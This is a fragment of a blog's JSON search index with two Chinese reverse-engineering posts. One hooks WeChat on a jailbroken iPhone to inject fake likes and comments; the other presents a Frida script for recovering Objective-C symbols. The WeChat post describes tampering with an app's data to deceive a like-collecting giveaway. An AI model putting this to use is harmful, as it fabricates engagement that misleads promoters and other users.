tbn2SXE35Xl4k24JJPHBnrmPVUCtjHoF23eTj3JhUtLNDooRBvW6hxUXLhMvbStpbQgK5IHpLlxjUbM80HAg2PZf5EmtuhObHGh40X2XR3chM9/BGD7KDOxksNZKxdeeAo5cafPAdSBVlm8oc263Nb4hOzX4i0NQAVwWawlsoBK2VMhjq86tCShJ5+VVa54lnEslglXZqKSBjHWxGg4KWCENPViEjTb7KPwfJTEfXIoaF2VCaNrtMz84CrFVLY7XVTUaNmiWEqCy1Ma5aZf0t9nb6jWeJ5RfmJcpHh0n8s27Dll6F2fmU5fzkHobWYmJ+4ZzgRuXjCna6eO5CYD2Q7v6h7FGkq30NaQ9+Yy+g5tbw8XMM62mnzWqGJGcMduyttWySUIG8c0a8xgrxJUPaVQsBKLfTWrwdh4RqhqewbJhihS4SX1cBME49IbA7wC+ZWacECSOWW2y3hJxmcXYRxSkIci/xallQoqki68HNycTIaQM7iRlPQeY8rFUvWqkviOjsT5S7iOk5tG1lGQr7ji/4KeOInNLokuWSC1cx4BbPk+i+fOjUer5lJzU6WoW/N7Fmj0hlvLJ+uZoF2GPIjeq8C0PXPmpMPfbN16DXEsGpjJVN270jZ3jVBqNiyy1DWAfZa0f6ouqOLHxf06f4bHPEKcEhkm7gHf1T92Umn3jAiYCC2DX33LZ5oJCWQpGosUh2ivPngJibnGD8fCxB+u/OQw0pmTCKNt2NIKIILL4HPuuNdEMX85oCNmU7JRYq7SzF7Z7Wd9gyGXRT3L7DBrUJqV6idg4oKcxwI/6eDIqpl3dqDJnEm5ZyELug/r9J3Ex8/P9Xw3KAQeAvBGuFoiw6gtXiEmtRXUltN5tF2Dr4FK5pxYTdo2dLYV84d1Z3tAw6fto+suNpHz8R9bE9Ip3t8KVlNESOjpKG2+N8P2jG6K7DhpYrwHIIvc23wIRiYrpFPwFxUK5B0lJEOoPAyOc2dLz16OsjDikB70Zt342pCR3Gr5SY6LFL9PRGuTwi3MPPFpOlF16SyWxNegXr7hg4DTTKT+Zon/EtpvQz20iKYOec/UVMJKNeDxjDWhRau5caTehdd6A9hOcJpwPw8Nbs4bTkna9NyDoev57sGrTv+QUb9Xx5awvM3TsYLlGZwmVkoOFBcjAe/R2MCyV7lXnnFnwcfhrNWgmphZnQYAzp1vr2neHmmzjnIAXbUmu9Fw7sJ924ADFkRazWXGKtvHT+oCmb9VoZx2fmB3yg0t2E0XuuV815RZWJRnRGgiTMedPU988NdGk2Ip+uhfwW93xFp2MntaosyEio5fFw18zKsr9LnWqSEYm2dRlDkgNYBEh4Azn3O86ltgbvNV","tags":[{"name":"Electron","slug":"Electron","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"},{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"}]},{"title":"Android完全禁用Accessibility（通杀一切基于此的外挂）","date":"2019-07-24T12:02:54.000Z","path":"2019/07/24/android-disableAccessibility/android-disableAccessibility/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"Accessibility","slug":"Accessibility","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"}]},{"title":"微信集赞/评论插件分析及开发","date":"2019-07-22T02:22:01.000Z","path":"2019/07/22/fkwechatLike/fkwechatLike/","text":"微信集赞/评论插件分析及开发开始为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！ 理性分析再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。 准备条件 一台mac 一台越狱的iOS设备 ida/Hooper/theos flex/issh/xia0LLDB 其他常见逆向工具等 对于一贯喜欢上调试器分析得我，所以写了iSSH和xia0LLDB两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。 逆向分析逆向赞和评论的数据模型一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为WCTimeLineViewController而且界面是一个UITableView 将wechat执行文件拖入Hooper（wechat文件太大，ida分析会很卡）找到UITableView的代理方法：-[WCTimeLineViewController tableView:cellForRowAtIndexPath:] 这里面肯定会根据模型去设置cell数据 r2 = [r28 section]; var_70 = r25; r24 = [r25 calcDataItemIndex:r2]; r25 = [[MMServiceCenter defaultCenter] retain]; r2 = [WCFacade class]; var_78 = r28; r0 = [r25 getService:r2]; r0 = [r0 retain]; r24 = [[r0 getTimelineDataItemOfIndex:r24] retain]; [r0 release]; [r25 release]; r19 = [[MMServiceCenter defaultCenter] retain]; r0 = [r19 getService:[WCFacade class]]; r0 = [r0 retain]; r25 = [[r0 getLayerIdForDataItem:r24] retain]; [r0 release]; [r19 release]; r19 = [[MMServiceCenter defaultCenter] retain]; r0 = [r19 getService:[WCFacade class]]; r0 = [r0 retain]; r20 = r0; r0 = [r0 getShowTip:r24 layerId:r25]; r29 = r29; r26 = [r0 retain]; [r20 release]; [r19 release]; 整理下来就是 [[MMServiceCenter defaultCenter] getService:[WCFacade class]]会得到一个WCFacade对象，然后通过 [WCFacade getTimelineDataItemOfIndex:]就能得到cell的数据 看到这里，上调试器！看下都是什么数据… 将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信 直接输入issh debug -a wechat就能挂上微信 xia0 ~ $ issh debug -a wechat [I]:iproxy process for 2222 port alive, pid=1382 [I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [I]:iOSRE dir exist [I]:iproxy process for 1234 port alive, pid=1395 [I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null) [I]:/iOSRE/tools/debugserver file exist, Start debug... [I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat 打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本） xia0 ~ $ lldb &quot;xutil&quot; command installed -&gt; xutil &quot;choose&quot; command installed -&gt; choose &quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:] &quot;sbt&quot; command installed -&gt; sbt // 连接到远端 (lldb) pcc 这里有两种方法： 一种是用xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;下断点去查看； // 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点 (lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot; (lldb) c 第二种是由于lldb支持choose命令，可以直接拿到WCFacade对象。既然如此选choose (lldb) choose WCFacade &lt;__NSArrayM 0x2823d9860&gt;( &lt;WCFacade: 0x139e1c030&gt; ) 调用其getTimelineDataItemOfIndex:方法就能拿到第一条朋友圈的数据 (lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0] Class name: WCDataItem, addr: 0x13e2871d0 tid: 13121667995275047007 username: wxid_6913ohfkk7kq12 createtime: 1564224719 commentUsers: ( ) contentObj: &lt;WCContentItem: 0x2801f5500&gt; 输入ivars 0x13e2871d0就能拿到对象的所有属性值 (lldb) ivars 0x13e2871d0 &lt;WCDataItem: 0x13e2871d0&gt;: in WCDataItem: cid (int): 0 tid (NSString*): @&quot;13121667995275047007&quot; type (int): 0 flag (int): 0 username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot; nickname (NSString*): @&quot;xia0&quot; createtime (int): 1564224719 locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt; likeFlag (BOOL): NO likeCount (int): 0 likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt; commentCount (int): 0 commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt; contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt; appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt; contentDesc (NSString*): @&quot;test&quot; 由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。 里面我们还发现了likeUsers和commentUsers的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。 likeCount (int): 1 likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt; 发现赞的数量变为1了，在看下里面的内容 (lldb) po 0x283e37060 &lt;__NSArrayM 0x283e37060&gt;( Class name: WCUserComment username: wxid_6913ohfkk7kq12 nickname: xia0 content: source: 0 type: 1 createTime: 1564225007 isLocalAdded: 0 commentID: (null) comment64ID: (null) refCommentID: (null) refComment64ID: (null) refUserName: bDeleted: 0 ) 正是我自己的微信号。同理可以得到评论 commentCount (int): 1 commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt; (lldb) po 0x283e349c0 &lt;__NSArrayM 0x283e349c0&gt;( Class name: WCUserComment username: wxid_6913ohfkk7kq12 nickname: xia0 content: 评论测试 source: 0 type: 2 createTime: 1564225144 isLocalAdded: 1 commentID: (null) comment64ID: (null) refCommentID: (null) refComment64ID: (null) refUserName: (null) bDeleted: 0 ) 到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。 最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。 寻找HOOK点先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个WCDataItem对象，那么我们可以对WCDataItem里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？ 但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样 (lldb) bt * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1 * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888 frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004 frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340 frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228 frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92 frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992 frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240 frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776 frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248 frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932 但是用我写的sbt命令就能恢复oc符号，下面我们对-[WCDataItem setCid:]下断点，然后得到调用栈 (lldb) sbt ==========================================xia0LLDB========================================== BlockSymbolFile Not Set The Block Symbol Json File, Try &#39;sbt -f&#39; ============================================================================================ frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0 frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004 frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340 frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228 frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92 frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64 frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116 frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48 frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552 frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348 frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233 frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732 frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112 frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336 frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728 frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68 frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84 frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88 frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32 frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884 frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252 frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832 frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452 frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104 frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216 frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268 frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4 可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程 其中里面有个很明显的方法 -[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] 看名字就知道，这个应该就是我们需要的hook点。 整理思路整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。 大概的代码逻辑应该如下 在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈 取出自己朋友圈的赞和评论数据备用 随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面 下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。 这里分析的过程和上面类似，我选择的hook点为：-[WCCommentDetailViewControllerFB setDataItem:] 代码实现具体的代码实现这里就不再去分析了，我把代码开源到了这里fkwechatzan 完成效果 集赞助手设置界面 朋友圈详情界面 赞和评论 一点总结本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。 最后，妈妈再也不用担心没有人赞我的朋友圈了~ 下次集赞领礼品的活动我要定了！","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"}]},{"title":"Frida调用栈符号恢复","date":"2019-07-02T09:00:14.000Z","path":"2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/","text":"Frida调用栈符号恢复开始搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决lldb调试器栈符号恢复)方案，决定把lldb的栈符号恢复脚本移植到frida中。 如何恢复已经去掉符号表的可执行文件？这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。 OC函数符号恢复思路首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。 根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？ 这里有两种办法： 第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。 第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有objc_copyClassNamesForImage、class_copyMethodList 、objc_getClass、method_getImplementation、method_getName、objc_getClass、objc_getMetaClass 现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。 frida的js环境编写代码由于我之前在lldb的python脚本中写过该过程代码(lldb内置的OC解释器语法要求十分严格，调试了很久的代码) 按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。 主要的代码如下： 根据模块路径获取其所有的类 function getAllClass(modulePath){ // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount) var objc_copyClassNamesForImage = new NativeFunction( Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;), &#39;pointer&#39;, [&#39;pointer&#39;, &#39;pointer&#39;] ); // free var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]); // if given modulePath nil, default is mainBundle if(!modulePath){ var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String(); }else{ var path = modulePath; } // create args var pPath = Memory.allocUtf8String(path); var p = Memory.alloc(Process.pointerSize); Memory.writeUInt(p, 0); var pClasses = objc_copyClassNamesForImage(pPath, p); var count = Memory.readUInt(p); var classes = new Array(count); for (var i = 0; i &lt; count; i++) { var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize)); classes[i] = Memory.readUtf8String(pClassName); } free(pClasses); // XLOG(classes) return classes; } 根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。 function getAllMethods(classname){ var objc_getClass = new NativeFunction( Module.findExportByName(null, &#39;objc_getClass&#39;), &#39;pointer&#39;, [&#39;pointer&#39;] ); var class_copyMethodList = new NativeFunction( Module.findExportByName(null, &#39;class_copyMethodList&#39;), &#39;pointer&#39;, [&#39;pointer&#39;, &#39;pointer&#39;] ); var objc_getMetaClass = new NativeFunction( Module.findExportByName(null, &#39;objc_getMetaClass&#39;), &#39;pointer&#39;, [&#39;pointer&#39;] ); var method_getName = new NativeFunction( Module.findExportByName(null, &#39;method_getName&#39;), &#39;pointer&#39;, [&#39;pointer&#39;] ); var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]); // get objclass and metaclass var name = Memory.allocUtf8String(classname); var objClass = objc_getClass(name) var metaClass = objc_getMetaClass(name) // get obj class all methods var size_ptr = Memory.alloc(Process.pointerSize); Memory.writeUInt(size_ptr, 0); var pObjMethods = class_copyMethodList(objClass, size_ptr); var count = Memory.readUInt(size_ptr); var allMethods = new Array(); var allObjMethods = new Array(); // get obj class all methods name and IMP for (var i = 0; i &lt; count; i++) { var curObjMethod = new Array(); var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize)) var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL)) var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize)) // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP) curObjMethod.push(pObjMethodName) curObjMethod.push(objMethodIMP) allObjMethods.push(curObjMethod) } var allMetaMethods = new Array(); // get meta class all methods name and IMP var pMetaMethods = class_copyMethodList(metaClass, size_ptr); var count = Memory.readUInt(size_ptr); for (var i = 0; i &lt; count; i++) { var curMetaMethod = new Array(); var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize)) var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL)) var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize)) //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP) curMetaMethod.push(pMetaMethodName) curMetaMethod.push(metaMethodIMP) allMetaMethods.push(curMetaMethod) } allMethods.push(allObjMethods) allMethods.push(allMetaMethods) free(pObjMethods); free(pMetaMethods); return allMethods; } 通过调用栈地址根据最近匹配的算法去找到对应的符号信息 function findSymbolFromAddress(modulePath,addr){ var frameAddr = addr var theDis = 0xffffffffffffffff; var tmpDis = 0; var theClass = &quot;None&quot; var theMethodName = &quot;None&quot; var theMethodType = &quot;-&quot; var theMethodIMP = 0 var allClassInfo = {} var allClass = getAllClass(modulePath); for(var i = 0, len = allClass.length; i &lt; len; i++){ var mInfo = getAllMethods(allClass[i]); var curClassName = allClass[i] objms = mInfo[0]; for(var j = 0, olen = objms.length; j &lt; olen; j++){ mname = objms[j][0] mIMP = objms[j][1] if(frameAddr &gt;= mIMP){ tmpDis = frameAddr-mIMP if(tmpDis &lt; theDis){ theDis = tmpDis theClass = curClassName theMethodName = mname theMethodIMP = mIMP theMethodType = &quot;-&quot; } } } metams = mInfo[1]; for(var k = 0, mlen = metams.length; k &lt; mlen; k++){ mname = metams[k][0] mIMP = metams[k][1] if(frameAddr &gt;= mIMP){ tmpDis = frameAddr-mIMP if(tmpDis &lt; theDis){ theDis = tmpDis theClass = curClassName theMethodName = mname theMethodIMP = mIMP theMethodType = &quot;+&quot; } } } } symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot; if(symbol.indexOf(&quot;.cxx&quot;)!=-1){ symbol = &quot;maybe C function?&quot; } // if distance &gt; 3000, maybe a c function if(theDis &gt; 3000){ symbol = &quot;maybe C function? symbol:&quot; + symbol } return symbol; } 在匹配算法的最后还进行了一些判断，当解析出来的方法名包含.cxx方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。 最后完整的项目地址：https://github.com/4ch12dy/xia0FridaScript 测试我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本 #!/usr/bin/python import frida import sys import codecs import os PACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot; def on_message(message, data): try: if message: print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;])) except Exception as e: print(message) print(e) def xia0CallStackSymbolsTest(): script_dir = os.path.dirname(os.path.realpath(__file__)) xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;) source = &#39;&#39; with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f: source = source + f.read() js = &#39;&#39;&#39; if (ObjC.available) { try { //Your class name here - ZYOperationView operationCopyLink var className = &quot;ZYMediaDownloadHelper&quot;; //Your function name here var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;; var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;); Interceptor.attach(hook.implementation, { onEnter: function(args) { // args[0] is self // args[1] is selector (SEL &quot;sendMessageWithText:&quot;) // args[2] holds the first function argument, an NSString console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName); // just call [NSThread callStackSymbols] var threadClass = ObjC.classes.NSThread var symbols = threadClass[&quot;+ callStackSymbols&quot;]() console.log(symbols) // call xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address] xia0CallStackSymbols(true); xia0CallStackSymbols(false); } }); } catch(err) { console.log(&quot;[!] Exception2: &quot; + err.message); } } else { console.log(&quot;Objective-C Runtime is not available!&quot;); } &#39;&#39;&#39; return source+js def do_hook(): return xia0CallStackSymbolsTest() if __name__ == &#39;__main__&#39;: try: device = frida.get_device_manager().enumerate_devices()[-1] print device pid = device.spawn([PACKAGE_NAME]) print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid)) session = device.attach(pid) device.resume(pid) script = session.create_script(do_hook()) script.on(&#39;message&#39;, on_message) script.load() sys.stdin.read() except KeyboardInterrupt: sys.exit(0) 只需要将xia0CallStackSymbols.js脚本放到项目中，然后用以下代码即可导入使用 script_dir = os.path.dirname(os.path.realpath(__file__)) xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;) source = &#39;&#39; with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f: source = source + f.read() your_frida_js_hook_script = &quot;&quot; load_js = your_frida_js_hook_script+source 恢复的效果如下： 通过[NSThread callStackSymbols]获取的调用栈符号 通过调用xia0CallStackSymbols函数获取的调用栈符号 作为比较，我在放上lldb中恢复调用栈 这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在这里，现在还能支持block函数的符号恢复。 这里有几个问题需要说明一下： xia0CallStackSymbols的符号为什么前15个地址没有显示？ 因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。 xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号 如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况) xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。 遗留问题/Todo 在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。 在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。 关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号 题外话短视频下载去水印如果有人感兴趣的话，可以点这里，目前支持的有皮皮搞笑、抖音（我不看抖音！） 参考 https://github.com/poxyran/misc &lt; https://github.com/iddoeldor/frida-snippets &gt; http://www.blogfshare.com/ioss-validate-address.html https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/ https://github.com/interference-security/frida-scripts https://github.com/dweinstein/awesome-frida https://www.frida.re/docs/javascript-api/","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"frida","slug":"frida","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"}]},{"title":"android调试深度总结","date":"2019-06-04T14:54:21.000Z","path":"2019/06/04/andoid-debug-note/andoid-debug-note/","text":"Need password to decrypt! Incorrect Password! No content to display! 